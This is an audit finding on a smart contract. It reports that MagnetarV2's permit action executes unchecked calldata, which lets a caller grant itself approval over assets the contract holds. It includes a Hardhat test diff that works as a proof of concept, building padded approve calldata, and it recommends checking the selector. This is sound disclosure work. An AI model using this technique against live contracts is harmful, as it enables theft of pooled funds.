[H-49] User can give himself approval for all assets held byMagnetarV2contract
Submitted by0xTheC0der, also found byAckanddirk_y
When callingMagnetarV2._permit(…)through invoking a permit (or permit all) action viaMagnetarV2.burst(…), one can also execute other calls thanERC20.permit(...)due to the following reasons / under the following constraints:
Thetargetaddress can be chosen freely, can be any contract, asset, token, NFT, etc.The function selector inactionCalldatais not checked, i.e. not required to beERC20.permit(...)The first parameter in the encodedactionCalldatamustbe equal tomsg.senderThe length of theactionCalldatashould match the length of an encoded call toERC20.permit(...)to avoid issues onabi.decode(...)
Given this information, an attacker can easily craft calls to give him approval for any assets held by theMagnetarV2contract or directly invoke a transfer. There are potentially other malicious calls that can be crafted and executed via the permit action, therefore the mentioned approve/transfer calls are only an example.
In order for this to cause loss of funds for the DAO, theMagnetarV2contract needs to hold (be the owner of) assets in the first place which seems likely since it is a main entry point and interacts with other important parts of the protocol like Singularity, BigBang, TapiocaOptionBroker and MagnetarMarketModule(troughdelegatecallin some cases).
Proof of Concept
The following PoC is based on an existing test case and demonstrates that an attacker can give himself the approval of theMagnetarV2contract for an ERC20 token.
Just apply thediffbelow intapioca-periph-auditand run the test case withnpx hardhat test test/magnetar.test.ts:
diff --git a/test/magnetar.test.ts b/test/magnetar.test.tsindex 63d108e..f32659d 100644--- a/test/magnetar.test.ts+++ b/test/magnetar.test.ts@@ -439,7 +439,7 @@ describe('MagnetarV2', () => {});describe('permits', () => {-        it('should test an array of permits', async () => {+        it.only('approve via permit action', async () => {const { deployer, eoa1, magnetar } = await loadFixture(register);const name = 'Token One';@@ -486,39 +486,38 @@ describe('MagnetarV2', () => {);const signature = signTypedMessage(privateKey, { data });const { v, r, s } = fromRpcSig(signature);-++            // Original permit calldata: user/deployer gives approval about value to eo1const permitEncodedFnData = tokenOne.interface.encodeFunctionData('permit',[deployer.address, eoa1.address, value, MAX_DEADLINE, v, r, s],);++            // Crafted approve calldata: magnetar gives approval about value to user/deployer+            const approveEncodedFnData = tokenOne.interface.encodeFunctionData(+                'approve',+                [deployer.address, value],+            );++            // Pad approve calldata to length of permit calldata, otherwise magnetar reverts when decoding+            const approveEncodedFnDataPadded = approveEncodedFnData.padEnd(permitEncodedFnData.length, '0');await magnetar.connect(deployer).burst([{-                    id: 2,+                    id: 2,      // PERMITtarget: tokenOne.address,value: 0,allowFailure: false,-                    call: permitEncodedFnData,+                    call: approveEncodedFnDataPadded, // provide padded approval calldata},]);+            // Check if approval was successfulconst allowance = await tokenOne.allowance(+                magnetar.address,deployer.address,-                eoa1.address,);expect(allowance.eq(value)).to.be.true;--            await expect(-                magnetar.connect(deployer).burst([-                    {-                        id: 2,-                        target: tokenOne.address,-                        value: 0,-                        allowFailure: false,-                        call: permitEncodedFnData,-                    },-                ]),-            ).to.be.reverted;});});
Tools Used
VS Code, Hardhat
Recommended Mitigation Steps
Require the function selector (first 4 bytes ofactionCalldata) to match anERC*.permit(...)call inMagnetarV2._permit(…).
0xRektora (Tapioca) confirmed